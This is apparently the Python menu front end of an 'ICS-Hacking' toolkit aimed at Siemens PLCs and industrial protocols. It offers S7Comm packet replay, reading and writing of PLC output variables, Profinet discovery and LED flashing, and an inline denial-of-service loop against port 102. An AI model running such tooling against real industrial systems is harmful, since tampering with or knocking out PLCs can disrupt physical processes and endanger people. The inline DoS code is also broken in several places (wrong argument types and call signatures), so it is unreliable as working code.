from numpy import character
from S7comm import mainS7comm
from PnetPbus import Discovery
from PnetPbus import FlashLED
import sys, socket, pickle, struct,time, threading, snap7
from tkinter import *
from pymodbus.client.sync import ModbusTcpClient
from SCADA import SCADA_LAB
from time import sleep 
import os

def clearScreen():
    clear = lambda: os.system('clear')
    clear()

def intro():
    display = \
    "==========================\n\n"+\
    "       ICS-Hacking\n\n"+\
    "==========================\n"+\
    "® by Miguel Oleo Blanco\n\n"

    print(display)



def menu():
    menu_options = {
    1: 'S7Comm',
    2: 'S7Comm-plus',
    3: 'SCADA',
    4: 'Profinet & Profibus',
    5: 'Exit',
    }

    for key in menu_options.keys():
        print (key, '--', menu_options[key] )

def menuS7Comm():
    menu_options = {
    1: 'Real Lab Project',
    2: 'Packet Replay',
    3: 'Read & Write Q variables',
    4: 'Exit',
    }

    for key in menu_options.keys():
        print (key, '--', menu_options[key] )

def menuPandP():
    menu_options = {
    1: 'Discovery',
    2: 'Flash LED',
    3: 'Exit',
    }

    for key in menu_options.keys():
        print (key, '--', menu_options[key] )


if __name__ == "__main__":
    while(True):
        clearScreen()
        intro()
        menu()
        option = ''
        try:
            option = int(input('Enter your choice: '))
        except:
            print('Wrong input. Please enter a number ...')
        #Check what choice was entered and act accordingly
        if option == 1:
            while(True):
                clearScreen()
                menuS7Comm()
                try:
                    choice = int(input('Enter your choice: '))
                except:
                    print('Wrong input. Please enter a number ...')
                if choice == 1:
                    print("Now you will be asked to type in the dst IP, RACK and SLOT.\n")
                    print("No error will be corrected, please make sure you type in valid values.\n")
                    IP = str(input('Please, type in the destination IP: '))
                    RACK = int(input('Please, type in the RACK number (defult is set to 0): '))
                    SLOT = int(input('Please, type in the SLOT number (default is set to 1): '))
                    mainS7comm.labProject(IP,RACK,SLOT)

                elif choice == 2:
                    print("Now you will be asked to type in the dst IP, RACK and SLOT.\n")
                    print("No error will be corrected, please make sure you type in valid values.\n")
                    IP = str(input('Please, type in the destination IP: '))
                    HEX = str(input('Please, type in the hex dump of the packet you want to send: '))

                    mainS7comm.packetReplay(IP,HEX)

                elif choice == 3:
                    print("Now you will be asked to type in the dst IP, RACK and SLOT.\n")
                    print("No error will be corrected, please make sure you type in valid values.\n")
                    IP = str(input('Please, type in the destination IP: '))
                    RACK = int(input('Please, type in the RACK number (defult is set to 0): '))
                    SLOT = int(input('Please, type in the SLOT number (default is set to 1): '))

                    mainS7comm.QReadWrite(IP,RACK,SLOT)

                elif choice == 4:
                    print('Thanks message before exiting')
                    break
                else:
                    print('Invalid option. Please enter a number between 1 and 4.\n\n')

        elif option == 2:
            print("For S7Comm-Plus there is a denial of service attak. You will be asked for some information\n\n")
            print("========== IMPORTANT ===========\n")
            print("The only way to stop this attack is closing this programm or typing cntrl+C or waiting it to complete the iterations\n\n")

            IP = str(input('Please, type in the destination IP: '))
            PORT = str(input('Please, type in the S7Comm-plus port (default is 102 for Siemens): '))
            ITERS = str(input('Please, type in the the number of tries the denial of service will run (equals running time): '))

            for x in range(1,ITERS): 
                s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                connect=s.connect(IP, PORT)
                s.send('some evil string \r\n\n') 
                print ("bufff " + str(x) + " sent...\n")
                result=s.recv(1024) 
                print(result )
                s.close() 
                sleep(7)
            
        elif option == 3:
            IP = str(input('Please, type in the destination IP: '))
            RACK = str(input('Please, type in the RACK (DEFAULT IS 0): '))
            SLOT = str(input('Please, type in the the SLOT (DEFAULT IS 1): '))    

            plc = snap7.client.Client() #Creates a client
            plc.connect(IP,RACK,SLOT)   #Connects to the client
            QB = plc.ab_read(2,7)

            client = ModbusTcpClient(IP)
            #client.write_coil(0, 0)
            client.close()

            g = SCADA_LAB.GUI(plc,client)
        elif option == 4:
            while(True):
                clearScreen()
                menuPandP()
                try:
                    choice = int(input('Enter your choice: '))
                except:
                    print('Wrong input. Please enter a number ...')
                if choice == 1:

                    MAC = str(input('Please, type in your MAC address without colons (example: 001122334455): '))
                    Discovery(MAC)
                elif choice == 2:
                    Macdst = str(input('Please, type in the destination MAC address without colons (example: 001122334455): '))
                    Macog = str(input('Please, type in your MAC address without colons (example: 001122334455): '))
                    FlashLED(Macdst,Macog)
                elif choice == 3:
                    print('Thanks message before exiting')
                    break
        elif option == 5:
            print('Thanks for using the package. For more info, refer to the GitHub Repo.')
            exit()
        else:
            print('Invalid option. Please enter a number between 1 and 5.\n\n')


